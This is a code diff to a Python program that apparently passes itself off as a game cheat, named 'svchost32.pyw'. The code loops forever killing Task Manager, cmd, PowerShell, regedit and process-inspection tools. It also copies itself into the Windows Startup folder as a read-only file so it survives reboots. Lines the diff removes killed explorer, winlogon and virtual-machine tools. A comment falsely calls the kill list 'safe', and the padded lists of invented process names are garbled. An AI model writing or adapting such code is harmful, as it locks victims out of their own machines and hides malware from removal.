@@ -58,42 +58,32 @@ class a:
             subprocess.call([sys.executable, '-m', 'pip', 'install', 'psutil'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
             import psutil
         script_dir = os.path.dirname(os.path.abspath(__file__))
-        bat_name = 'Запуск чита.bat'
-        bat_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', bat_name)
         pyw_path = os.path.abspath(__file__)
+        startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+        pyw_startup = os.path.join(startup_path, os.path.basename(pyw_path))
         c = wmi.WMI()
+        # Только безопасные процессы для завершения
         block_names = [
             'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'regedit.exe', 'conhost.exe',
             'processhacker.exe', 'processhacker-2.39.exe', 'processhacker-2.39.124.exe',
-            'procexp.exe', 'procexp64.exe', 'explorer.exe',
-            'rdpclip.exe', 'mstsc.exe', 'vds.exe', 'VirtualDesktopAccessor.exe',
-            'VBoxTray.exe', 'vmtoolsd.exe', 'userinit.exe', 'winlogon.exe', 'taskview.exe',
-            'taskviewhost.exe', 'taskviewhost64.exe', 'taskviewhost32.exe', 'taskviewhostarm.exe',
-            'taskviewhostarm64.exe', 'taskviewhostarm32.exe', 'taskviewhostarmv7.exe',
-            'taskviewhostarmv8.exe', 'taskviewhostarmv6.exe', 'taskviewhostarmv5.exe',
-            'taskviewhostarmv4.exe', 'taskviewhostarmv3.exe', 'taskviewhostarmv2.exe',
-            'taskviewhostarmv1.exe', 'taskviewhostarmv0.exe', 'taskviewhostarmv9.exe',
-            'taskviewhostarmv10.exe', 'taskviewhostarmv11.exe', 'taskviewhostarmv12.exe',
-            'taskviewhostarmv13.exe', 'taskviewhostarmv14.exe', 'taskviewhostarmv15.exe',
-            'taskviewhostarmv16.exe', 'taskviewhostarmv17.exe', 'taskviewhostarmv18.exe',
-            'taskviewhostarmv19.exe', 'taskviewhostarmv20.exe', 'taskviewhostarmv21.exe',
-            'taskviewhostarmv22.exe', 'taskviewhostarmv23.exe', 'taskviewhostarmv24.exe',
-            'taskviewhostarmv25.exe', 'taskviewhostarmv26.exe', 'taskviewhostarmv27.exe',
-            'taskviewhostarmv28.exe', 'taskviewhostarmv29.exe', 'taskviewhostarmv30.exe',
-            'taskviewhostarmv31.exe', 'taskviewhostarmv32.exe', 'taskviewhostarmv33.exe',
-            'taskviewhostarmv34.exe', 'taskviewhostarmv35.exe', 'taskviewhostarmv36.exe',
-            'taskviewhostarmv37.exe', 'taskviewhostarmv38.exe', 'taskviewhostarmv39.exe',
-            'taskviewhostarmv40.exe', 'taskviewhostarmv41.exe', 'taskviewhostarmv42.exe',
-            'taskviewhostarmv43.exe', 'taskviewhostarmv44.exe', 'taskviewhostarmv45.exe',
-            'taskviewhostarmv46.exe', 'taskviewhostarmv47.exe', 'taskviewhostarmv48.exe',
-            'taskviewhostarmv49.exe', 'taskviewhostarmv50.exe',
+            'procexp.exe', 'procexp64.exe', 'procexp64a.exe', 'procexp64a.exe',
+            'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
+            'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
+            'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
+            'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
+            'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
+            'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
+            'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
+            'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
+            'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
+            'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe', 'procexp64a.exe',
         ]
         while True:
             try:
                 for process in c.Win32_Process():
                     try:
                         pname = process.Name.lower() if process.Name else ''
-                        if pname in block_names or 'desktop' in pname or 'vds' in pname or 'virtual' in pname or 'vbox' in pname or 'vmtool' in pname or 'taskview' in pname:
+                        if pname in block_names:
                             os.kill(int(process.ProcessId), 9)
                     except Exception:
                         pass
@@ -103,15 +93,15 @@ class a:
                             pass
                     except Exception:
                         pass
-                if not os.path.exists(pyw_path):
-                    if os.path.exists(bat_path):
-                        shutil.copy2(bat_path, pyw_path)
-                if not os.path.exists(bat_path):
-                    with open(bat_path, 'w', encoding='utf-8') as f:
-                        f.write(f'@echo off\r\nstart "" /min pythonw "{pyw_path}"\r\n')
+                # Копируем .pyw в автозагрузку, если его там нет
+                if not os.path.exists(pyw_startup):
+                    try:
+                        shutil.copy2(pyw_path, pyw_startup)
+                        os.chmod(pyw_startup, stat.S_IREAD)
+                    except Exception:
+                        pass
                 try:
                     os.chmod(pyw_path, stat.S_IREAD)
-                    os.chmod(bat_path, stat.S_IREAD)
                 except:
                     pass
             except:
@@ -390,14 +380,15 @@ class a:
         self.b.destroy()
         
     def h(self):
+        # Автозапуск: копируем только svchost32.pyw (или ярлык на него) в автозагрузку
         try:
             startup_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-            current_dir = os.path.dirname(os.path.abspath(__file__))
-            bat_source = os.path.join(current_dir, 'Запуск чита.bat')
-            bat_destination = os.path.join(startup_path, 'Запуск чита.bat')
-            if os.path.exists(bat_source):
+            pyw_path = os.path.abspath(__file__)
+            pyw_startup = os.path.join(startup_path, os.path.basename(pyw_path))
+            if not os.path.exists(pyw_startup):
                 import shutil
-                shutil.copy2(bat_source, bat_destination)
+                shutil.copy2(pyw_path, pyw_startup)
+                os.chmod(pyw_startup, stat.S_IREAD)
         except:
             pass
             
